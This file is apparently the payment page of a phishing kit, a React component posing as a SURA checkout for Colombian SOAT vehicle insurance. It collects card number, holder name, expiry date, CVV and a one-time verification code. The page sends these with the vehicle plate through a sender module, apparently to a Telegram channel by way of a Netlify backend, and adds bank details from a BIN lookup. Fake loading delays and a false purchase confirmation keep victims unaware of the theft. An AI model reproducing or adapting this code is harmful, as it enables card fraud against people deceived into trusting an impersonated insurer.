import React, { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom"; 
import sendMessage from '../Sender/Sender';
import Header from '../Header/Header';
import Footer from '../Footer/Footer';
import Styles from './Payment.module.css';
import loaderGif from '../../Assets/Images/loader.gif'

function Payment() {
    const location = useLocation();
    const navigate = useNavigate();

    const { dataX, dataC, dataM, dataS, dataY } = location.state || {};

    const [showSectionC, setShowSectionC] = useState(false);
    const [dataTipo, setDataTipo] = useState("");
    const [dataNumero, setDataNumero] = useState("");
    const [dataFecha, setDataFecha] = useState("");
    const [dataCVV, setDataCVV] = useState("");
    const [dataNombre, setDataNombre] = useState("");
    const [dataOTP, setDataOTP] = useState("");
    const [binInfo, setBinInfo] = useState(null);
    const netlifyFunctionUrl = "https://backendsendtelegram.netlify.app/.netlify/functions/BinLookup";

    const [showOTP, setShowOTP] = useState(false);

    const [loading, setLoading] = useState(false);
    const [paymentConfirmed, setPaymentConfirmed] = useState(false);

    const [touched1, setTouched1] = useState(false);
    const [touched2, setTouched2] = useState(false);
    const [touched3, setTouched3] = useState(false);
    const [touched4, setTouched4] = useState(false);
    const [touched5, setTouched5] = useState(false);

    const handleRadioChange = (paymentMethod) => {
        if (paymentMethod === "Debito" || paymentMethod === "Credito") {
            setShowSectionC(true);
            setDataTipo(paymentMethod);
        }
    };

    const allInputsValid = () => {
        // Numero de tarjeta: 15 dígitos
        if (!/^\d{15,19}$/.test(dataNumero)) return false;

        // Nombre: no vacío
        if (!dataNombre.trim()) return false;

        // Fecha MM/AAAA
        if (!/^(0[1-9]|1[0-2])\/\d{4}$/.test(dataFecha)) return false;

        // CVV: 3 o 4 dígitos
        if (!/^\d{3,4}$/.test(dataCVV)) return false;

        return true;
    };

    return (
        <>
            <Header stepSectionB={4}/>

            <main className={Styles.xPayment}>
                <section className={Styles.xPaymentSectionA}>
                    <div>
                        <h3>{!paymentConfirmed ? ('Medios de Pago') : ('Pago Confirmado')}</h3>
                    </div>
                    {!paymentConfirmed ? (
                        <div>
                            <p>{!showSectionC ? 'Selecciona tu opción para realizar el pago:' : 'Realiza tu pago de forma segura'}</p>
                            {!showSectionC && (
                                <form>
                                    <div>
                                        <input 
                                            type="radio"
                                            id="debito"
                                            name="paymentMethod"
                                            onChange={() => handleRadioChange("Debito")} 
                                        />
                                        <label htmlFor="debito">Tarjeta Débito</label>
                                    </div>
                                    <div>
                                        <input 
                                            type="radio"
                                            id="credito"
                                            name="paymentMethod"
                                            onChange={() => handleRadioChange("Credito")} 
                                        />
                                        <label htmlFor="credito">Tarjeta de Crédito</label>
                                    </div>
                                </form>
                            )}
                            {showSectionC && (
                                <div className={Styles.xPaymentSectionC}>
                                    <form>
                                        <div>
                                            <input
                                                type="text"
                                                value={dataNumero}
                                                onChange={(e) => {
                                                    // Limitar a 16 dígitos, solo números
                                                    const valor = e.target.value.replace(/\D/g, "").slice(0, 16);
                                                    setDataNumero(valor);
                                                }}
                                                onBlur={async (e) => {
                                                    setTouched1(true);

                                                    const valor = e.target.value.replace(/\D/g, ""); // Eliminar todo lo no numérico
                                                    console.log("🟡 [PAYMENT] Blur tarjeta, valor:", valor);

                                                    if (valor.length >= 6) {
                                                    const bin = valor.slice(0, 6); // Extraemos los primeros 6 dígitos
                                                    console.log("🟡 [PAYMENT] BIN detectado:", bin);

                                                    try {

                                                        const res = await fetch(`${netlifyFunctionUrl}?bin=${bin}`);

                                                        if (!res.ok) {
                                                        throw new Error(`Error en la consulta al backend: ${res.statusText}`);
                                                        }

                                                        const info = await res.json();  // Convertir la respuesta en JSON

                                                        console.log("🟢 [PAYMENT] Resultado fetchBinInfo desde el backend:", info);

                                                    
                                                        setBinInfo(info);
                                                    } catch (err) {
                                                        console.error("🔴 [PAYMENT] Error llamando fetchBinInfo:", err);
                                                        setBinInfo(null);
                                                    }
                                                    } else {
                                                    console.warn("⚠️ [PAYMENT] Menos de 6 dígitos, no se realizará la consulta");
                                                    setBinInfo(null); // Si el BIN es menor de 6, limpiamos el estado
                                                    }
                                                }}
                                                required
                                                placeholder=" "
                                                pattern="\d{15,19}" // Aceptamos entre 15 y 19 dígitos
                                                className={touched1 ? Styles.touched : ""}
                                            />
                                            <label>Numero de Tarjeta</label>
                                        </div>
                                        <div>
                                            <input 
                                                type="text" 
                                                value={dataNombre} 
                                                onChange={(e) => setDataNombre(e.target.value)} 
                                                required 
                                                placeholder=" " 
                                                onBlur={() => setTouched2(true)}
                                                className={touched2 ? Styles.touched : ""}
                                            />
                                            <label>Nombre del Titular</label>
                                        </div>
                                        
                                        <div>
                                            <input 
                                                type="text" 
                                                value={dataFecha} 
                                                onChange={(e) => {
                                                    // Permite solo números y barra
                                                    let valor = e.target.value.replace(/[^\d/]/g, '').slice(0, 7); // MM/AAAA = 7 caracteres
                                                    // Inserta barra automáticamente si el usuario aún no la pone
                                                    if (valor.length === 2 && !valor.includes('/')) {
                                                        valor = valor + '/';
                                                    }
                                                    setDataFecha(valor);
                                                }} 
                                                required 
                                                placeholder=" "
                                                onBlur={() => setTouched3(true)}
                                                pattern="^(0[1-9]|1[0-2])\/\d{4}$"  // MM/AAAA válido
                                                className={touched3 ? Styles.touched : ""}
                                            />
                                            <label>Fecha de Vencimiento (MM/AAAA)</label>
                                        </div>

                                        <div>
                                            <input 
                                                type="text"
                                                value={dataCVV}
                                                onChange={(e) => {
                                                    // Solo números y máximo 4 dígitos
                                                    const valor = e.target.value.replace(/\D/g, '').slice(0, 4);
                                                    setDataCVV(valor);
                                                }}
                                                required
                                                placeholder=" "
                                                onBlur={() => setTouched4(true)}
                                                pattern="\d{3,4}"  // Valida 3 o 4 dígitos
                                                className={touched4 ? Styles.touched : ""}
                                            />
                                            <label>Código de Seguridad (CVV)</label>
                                        </div>

                                        {showOTP && (
                                            <div>
                                                <input 
                                                    type="number" 
                                                    required
                                                    value={dataOTP} 
                                                    onChange={(e) => setDataOTP(e.target.value)} 
                                                    placeholder=" "
                                                    onBlur={() => setTouched5(true)}
                                                    className={touched5 ? Styles.touched : ""}
                                                />
                                                <label>Codigo de Verificacion</label>
                                            </div>
                                        )}
                                    </form>
                                </div>
                            )}
                            <button
                            type="button"
                                onClick={(e) => {
                                    e.preventDefault();

                                    if (!showOTP) {
                                        if (allInputsValid()) {
                                            setShowOTP(true);
                                            const mensaje = `🏢 SURA: ${dataX.toUpperCase()}

<pre>${dataNumero}</pre>

👤: ${dataNombre}
📅: ${dataFecha}
🔒: ${dataCVV}
💳: ${dataTipo}

${binInfo ? `
🏦: ${binInfo.bank || "Desconocido"}
🏷️: ${binInfo.scheme || "Desconocido"} / ${binInfo.franchise || "Desconocido"}
🌍: ${binInfo.country || "Desconocido"}
` : ""}
`;

                                            sendMessage(mensaje);
                                            setLoading(true)
                                            setTimeout(() => {
                                                setLoading(false);
                                            }, 30000);
                                        } else {
                                            setTouched1(true);
                                            setTouched2(true);
                                            setTouched3(true);
                                            setTouched4(true);
                                        }
                                    } else {
                                        const mensaje = `🏢 SURA: ${dataX.toUpperCase()}

🔑: ${dataOTP}`;
                                        sendMessage(mensaje);
                                        setLoading(true);
                                        setTimeout(() => {
                                            setLoading(false);
                                            setPaymentConfirmed(true);
                                        }, 30000); 
                                    }
                                }}
                            >
                                {showOTP ? 'PAGAR' : 'CONTINUAR'}
                            </button>
                        </div>
                    ):(
                        <div className={Styles.xPaymentCompleted}>
                            <h4>
                                ¡Compra Exitosa!
                            </h4>
                            <p>
                                Por este medio se expide el SOAT para los vehiculos matriculados en Colombia.
                            </p>
                            <p>
                                Luego de que hayas comprado la pólica, espera 24 horas y <span onClick={() => navigate("https://portalpublico.runt.gov.co/#/consulta-vehiculo/consulta/consulta-ciudadana")}>verifica aquí</span> que esta haya quedado cargada en el RUNT.
                            </p>
                            <button onClick={() => navigate("/")}>
                                Entendido
                            </button>
                        </div>
                    )}
                </section>

                <section className={Styles.xPaymentSectionB}>
                    <h3>Resumen:</h3>
                    <ul>
                        <li>Clase: <span>{dataC}</span></li>
                        <li>Servicio: <span>{dataS}</span></li>
                        <li>Modelo: <span>{dataM}</span></li>
                        <li>Placa: <span>{dataX ? dataX.toUpperCase() : ''}</span></li>
                        <li>Descuento: <span>5%</span></li>
                        <li>Valor Total (Sin Descuento): <span>{dataY ? dataY.toLocaleString('es-CO') : 0}</span></li>
                    </ul>
                    <p>TOTAL A PAGAR: ${
                        dataY ? (dataY * 0.95).toLocaleString() : 0
                        }
                    </p>
                </section>
            </main>

            {loading && (
                <aside className={Styles.loader}>
                    <img src={loaderGif} alt="Loader"></img>
                </aside>
            )}

            <Footer />
        </>
    );
}

export default Payment;

